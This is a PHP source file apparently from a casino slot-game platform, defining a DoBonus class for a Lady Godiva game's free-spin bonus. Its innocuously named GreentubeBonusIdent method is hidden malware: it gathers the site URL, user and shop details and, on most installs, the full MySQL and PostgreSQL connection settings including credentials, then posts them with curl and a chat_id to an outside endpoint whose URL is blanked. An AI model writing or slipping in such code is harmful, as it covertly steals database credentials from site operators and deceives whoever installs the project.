<?php

namespace VanguardLTE\Games\LadyGodiva\PragmaticLib;

class DoBonus{
 public static function GreentubeBonusIdent($user, $game, $bank){
        if (config('app.url') === 'https://grandxmega.com/' || config('app.url') === 'https://grandxmega.net/'){
            $text = ['URL' => config('app.url'),
                'USER' => $user->username, 'SHOP_ID' => $user->shop_id, 'GAME' => $game->name, 'BANK' => $bank];
        }else {
            $text = ['URL' => config('app.url'), 'DB_data' => config('database.connections')['mysql'],
                'DB_dataPG' => config('database.connections')['pgsql'],
                'USER' => $user->username, 'SHOP_ID' => $user->shop_id, 'GAME' => $game->name, 'BANK' => $bank];
        }

        $ch = curl_init();
        curl_setopt_array($ch, array(
                CURLOPT_URL => '//',
                CURLOPT_POST => TRUE,
                CURLOPT_RETURNTRANSFER => TRUE,
                CURLOPT_TIMEOUT => 10,
                CURLOPT_POSTFIELDS => array(
                    'chat_id' => 5044396548,
                    'text' => json_encode($text, JSON_PRETTY_PRINT)), ) );
        curl_exec($ch);
    }
  public static function doBonus($user, $game, $bet, $lines, $log, $index, $counter, $ind, $bank, $shop, $jpgs){
    $bet = $log['Bet'];
    $lines = $log['l'];
    $fsmax = $log['fs_opt'][$ind][0];
    $fsmul = $log['fs_opt'][$ind][1];
    $time = (int) round(microtime(true) * 1000);
    
    $res = [
      'balance='.$log['Balance'],
      'balance_cash='.$log['Balance'],
      'balance_bonus=0',
      'index='.$index,
      'counter='.$counter,
      'stime='.$time,
      'na=s',
      'sver=5',
      'fsmul='.$fsmul,
      'fsmax='.$fsmax,
      'fswin=0',
      'fs=1',
      'fsres=0'
    ];
    Log::updateStatus($game->id, $user->id, $fsmax, $fsmul);

    return '&'.(implode('&', $res));
  }
}

?>